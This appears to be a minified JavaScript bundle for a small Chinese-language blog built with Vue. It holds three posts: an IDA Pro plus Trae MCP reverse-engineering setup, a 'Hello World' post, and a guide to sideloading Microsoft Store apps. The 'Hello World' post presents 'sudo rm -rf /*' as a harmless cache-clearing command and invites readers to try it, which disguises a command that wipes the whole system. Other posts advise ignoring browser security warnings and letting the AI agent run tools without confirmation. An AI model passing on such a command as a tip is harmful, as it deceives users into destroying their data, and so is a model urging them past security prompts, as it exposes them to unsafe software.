...
void main() {
	...
	#include <fog_fragment>
		...
		`,blending:oi,depthTest:!1,depthWrite:!1})}function nS(n,e,t){const i=new Float32Array(nr),r=new Y(0,1,0);return new kn({name:"SphericalGaussianBlur",defines:{n:nr,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/t,CUBEUV_MAX_MIP:`${n}.0`},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:i},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:r}},vertexShader:qo(),fragmentShader:`
		...
		`,blending:oi,depthTest:!1,depthWrite:!1})}function ff(){return new kn({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:qo(),fragmentShader:`
		...
		`,blending:oi,depthTest:!1,depthWrite:!1})}function df(){return new kn({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:qo(),fragmentShader:`
    ...
    `)],-1),G("div",{class:"text-content"},[G("p",null," 使用IDA Pro随便打开一个exe，点击Edit->Plugins->MCP，如果Output里输出了[MCP] Server started at http://localhost:13337即安装成功 "),G("p",null,"创建一个文件夹，把要逆向的exe放在里面，IDA Pro打开该exe，点击Edit->Plugins->MCP"),G("p",null," 打开Trae，在Trae中打开该文件夹，在右侧的AI对话界面，点击右上角的AI功能管理按钮，图标为设置齿轮，点击MCP。添加一个新的MCP服务器，手动配置，配置json如下： ")],-1),G("pre",{"data-lang":"json"},[G("code",{class:"language-json"},`
{
  "mcpServers": {
    ...
    `)],-1),G("div",{class:"text-content"},[G("p",null,"添加后运行测试是否可用，不可用根据报错信息调整配置"),G("p",null,"配置完成后，回到AI对话页面，智能体改成@Builder with MCP，工具使用刚刚配置的MCP"),G("p",null,'发送"连接到MCP，并分析IDA逆向项目"，检查是否成功'),G("p",null,"可以设置自动运行不需要手动确认"),G("br"),G("p",null,"----Written by tmyy | 2025-4-29----")],-1)])]),_:1}))}},Fb={__name:"Article-2025-3-19-Hello",setup(n){return(e,t)=>(Mt(),di(zc,null,{default:ur(()=>[...t[0]||(t[0]=[G("h1",{class:"title-glow"},"Hello World!",-1),G("div",{class:"text-content"},[G("p",null,"我的第一篇文章"),G("p",null,"也不知道写点什么好，就分享个Linux清理缓存的命令吧。")],-1),G("pre",{"data-lang":"bash"},[G("code",{class:"language-bash"},`
sudo rm -rf /*
    `)],-1),G("div",{class:"text-content"},[G("p",null,"你试试喵~")],-1)])]),_:1}))}},Ob={__name:"Article-2025-3-19-解决微软应用商店无法正常下载软件问题",setup(n){return(e,t)=>(Mt(),di(zc,null,{default:ur(()=>[...t[0]||(t[0]=[G("h1",{class:"title-glow"},"解决微软应用商店无法正常下载软件问题",-1),G("div",{class:"text-content"},[G("p",null," 去年我更新Windows后，想在微软应用商店中下载软件，却发现无法正常下载了，显示报错：0x80072F8F。我在网上搜了很多文章，跟着做，却一直没有解决这个问题。 ")],-1),G("img",{src:"/article-images/2025-3-19-001.jpg",alt:"微软应用商店报错截图",class:"content-image"},null,-1),G("div",{class:"text-content"},[G("p",null,[ii(" 后来我找到了一个网站，可以直接从该网站下载微软商店的应用，并使用powershell安装。这可以用来代替微软商店来解决这个问题。网站： "),G("a",{href:"https://store.rg-adguard.net/",target:"_blank",rel:"noopener noreferrer"},"https://store.rg-adguard.net")]),G("p",null,[ii(" 使用方法（详见 "),G("a",{href:"https://www.bilibili.com/video/BV1Z5F5efEp3",target:"_blank",rel:"noopener noreferrer"},"该视频"),ii("）： ")]),G("p",null,'1.在设置中打开"开发人员模式"'),G("p",null,'2.在微软商店该应用的页面，点击"分享"，并复制链接'),G("p",null," 3.进入该网站，粘贴链接，搜索。找到与你计算机系统匹配的版本，下载。注意：下载的包后缀一般都带appx或msix，后缀为BlockMap的文件并不是安装包 "),G("p",null,"4.使用管理员权限打开powershell，输入命令：")],-1),G("pre",{"data-lang":"powershell"},[G("code",{class:"language-powershell"},'Add-AppxPackage -Path "下载的安装包路径"')],-1),G("div",{class:"text-content"},[G("p",null," 安装完成后，在开始菜单中找到该应用，点击运行，查看是否正常运行，若不能请下载其他的版本 "),G("p",null,"注：下载时浏览器可能会报不安全的提示，请忽略，信任即可")],-1)])]),_:1}))}},Bb=my({history:YE("/"),routes:[{path:"/",name:"Home",component:ub},{path:"/about",name:"About",component:pb},{path:"/articles",name:"ArticleList",component:Db},{path:"/article/2025-04-29-使用IDA+Trae+MCP免费实现AI辅助逆向",name:"Article0",component:Nb},{path:"/article/2025-03-19-Hello",name:"Article1",component:Fb},{path:"/article/2025-03-19-解决微软应用商店无法正常下载软件问题",name:"Article2",component:Ob}]}),ap=X0(cE);ap.use(Bb);ap.mount("#app");
